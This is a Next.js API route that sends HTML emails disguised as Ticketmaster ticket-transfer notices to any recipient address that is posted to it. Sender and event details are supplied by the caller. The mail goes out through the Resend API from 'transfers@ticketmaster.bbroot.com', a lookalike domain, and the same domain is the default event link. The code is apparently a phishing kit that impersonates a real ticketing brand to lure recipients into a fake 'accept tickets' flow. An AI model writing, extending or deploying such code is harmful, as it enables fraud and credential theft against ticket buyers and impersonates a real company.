import { NextResponse } from 'next/server'

export const runtime = 'nodejs'

const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/

function escapeHtml(value: string) {
  return value.replace(/[&<>"']/g, (character) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  })[character] ?? character)
}

function createTransferEmail({ senderName, recipientName, eventName, eventDate, venue, seats, eventUrl }: {
  senderName: string
  recipientName: string
  eventName: string
  eventDate: string
  venue: string
  seats: string
  eventUrl: string
}) {
  const safeSenderName = escapeHtml(senderName)
  const safeRecipientName = escapeHtml(recipientName)
  const safeEventName = escapeHtml(eventName)
  const safeEventDate = escapeHtml(eventDate)
  const safeVenue = escapeHtml(venue)
  const safeSeats = escapeHtml(seats)
  const safeEventUrl = escapeHtml(eventUrl)

  return `<!doctype html>
<html lang="en">
  <body style="margin:0;background:#f3f5f8;color:#182230;font-family:Arial,Helvetica,sans-serif">
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f3f5f8;padding:32px 12px">
      <tr><td align="center">
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;background:#ffffff">
          <tr><td style="height:6px;background:#123b78;font-size:0;line-height:0">&nbsp;</td></tr>
          <tr><td align="center" style="padding:28px 24px 22px;font-size:24px;font-weight:700;letter-spacing:.4px;color:#123b78">Event Transfer</td></tr>
          <tr><td style="padding:12px 32px 8px;text-align:center;font-size:26px;line-height:1.3;font-weight:700">${safeSenderName} transferred tickets to you</td></tr>
          <tr><td style="padding:0 32px 24px;text-align:center;font-size:18px;line-height:1.45;color:#344054">${safeEventName}</td></tr>
          <tr><td style="padding:0 32px 28px">
            <table role="presentation" width="100%" cellpadding="0" cellspacing="0"><tr>
              <td align="center" width="33%"><div style="margin:auto;width:42px;height:42px;border-radius:50%;background:#1769e0;color:#fff;font-weight:700;line-height:42px">1</div><div style="padding-top:8px;font-size:13px;font-weight:700;color:#1769e0">Pending</div></td>
              <td style="height:2px;background:#d8dee8;font-size:0">&nbsp;</td>
              <td align="center" width="33%"><div style="margin:auto;width:40px;height:40px;border:2px solid #c7ced9;border-radius:50%;color:#7b8798;line-height:40px">2</div><div style="padding-top:8px;font-size:13px;color:#667085">Accepted</div></td>
              <td style="height:2px;background:#d8dee8;font-size:0">&nbsp;</td>
              <td align="center" width="33%"><div style="margin:auto;width:40px;height:40px;border:2px solid #c7ced9;color:#7b8798;line-height:40px">3</div><div style="padding-top:8px;font-size:13px;color:#667085">Complete</div></td>
            </tr></table>
          </td></tr>
          <tr><td style="padding:0 32px 28px;font-size:16px;line-height:1.65"><p style="margin:0 0 18px">Hi ${safeRecipientName},</p><p style="margin:0">There are ticket(s) waiting to be accepted in your account. Accepting the ticket(s) will allow you to enter the event easily, using your own phone.</p></td></tr>
          <tr><td style="padding:0 32px 28px"><table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #d9dee7"><tr><td style="padding:26px"><div style="height:150px;background:#e7edf5;text-align:center;line-height:150px;color:#667085;font-size:18px">${safeEventName}</div><p style="margin:24px 0 8px;font-size:20px;font-weight:700">${safeEventName}</p><p style="margin:0;color:#667085;line-height:1.6">Event details will be available after accepting this transfer.</p><a href="#" style="display:block;margin-top:24px;background:#1769e0;color:#fff;text-align:center;text-decoration:none;padding:16px;font-weight:700;font-size:16px">ACCEPT TICKETS</a></td></tr></table></td></tr>
          <tr><td style="padding:0 32px 28px;color:#667085;font-size:13px;line-height:1.6">By accepting, you agree to the applicable event terms. If you did not expect this transfer, you can ignore this email.<br><br><strong>This email is NOT your ticket.</strong></td></tr>
          <tr><td align="center" style="background:#123b78;color:#fff;padding:24px;font-size:13px;line-height:1.5">Support: 707 Virginia Street East, Suite 170, Charleston, WV 25301</td></tr>
        </table>
      </td></tr>
    </table>
  </body>
</html>`
}

export async function POST(request: Request) {
  try {
    const body = await request.json() as { recipientEmail?: unknown; email?: unknown; senderName?: unknown; recipientName?: unknown; eventName?: unknown; eventDate?: unknown; venue?: unknown; seats?: unknown; eventUrl?: unknown }
    const recipientEmail = typeof body.recipientEmail === 'string'
      ? body.recipientEmail.trim()
      : typeof body.email === 'string'
        ? body.email.trim()
        : ''
    const senderName = typeof body.senderName === 'string' && body.senderName.trim()
      ? body.senderName.trim()
      : 'Account Holder'
    const recipientName = typeof body.recipientName === 'string' && body.recipientName.trim() ? body.recipientName.trim() : 'Ticket Recipient'
    const eventName = typeof body.eventName === 'string' && body.eventName.trim() ? body.eventName.trim() : 'Selected Event'
    const eventDate = typeof body.eventDate === 'string' && body.eventDate.trim() ? body.eventDate.trim() : 'Event date and time to be confirmed'
    const venue = typeof body.venue === 'string' && body.venue.trim() ? body.venue.trim() : 'Venue to be confirmed'
    const seats = typeof body.seats === 'string' && body.seats.trim() ? body.seats.trim() : 'Seat details to be confirmed'
    const eventUrl = typeof body.eventUrl === 'string' && /^https?:\/\//i.test(body.eventUrl.trim()) ? body.eventUrl.trim() : 'https://ticketmaster.bbroot.com'

    if (!emailPattern.test(recipientEmail)) {
      return NextResponse.json({ error: 'A valid recipientEmail or email is required.' }, { status: 400 })
    }

    const resendKey = process.env.RESEND ?? process.env.RESEND_API_KEY
    if (!resendKey) return NextResponse.json({ error: 'RESEND is not configured.' }, { status: 503 })

    let response: Response
    try {
      response = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: { Authorization: `Bearer ${resendKey}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          from: `Ticketmaster Transfer <transfers@ticketmaster.bbroot.com>`,
          to: [recipientEmail],
          subject: `You received tickets from ${senderName}`,
          html: createTransferEmail({ senderName, recipientName, eventName, eventDate, venue, seats, eventUrl }),
        }),
      })
    } catch (error) {
      console.error('Resend error:', error)
      return NextResponse.json({ error: 'Email could not be sent.' }, { status: 502 })
    }

    if (!response.ok) {
      const details = await response.text()
      console.error('[v0] Resend transfer email failed:', response.status, details)
      return NextResponse.json({ error: 'Email could not be sent.' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ error: 'Invalid transfer request.' }, { status: 400 })
  }
}
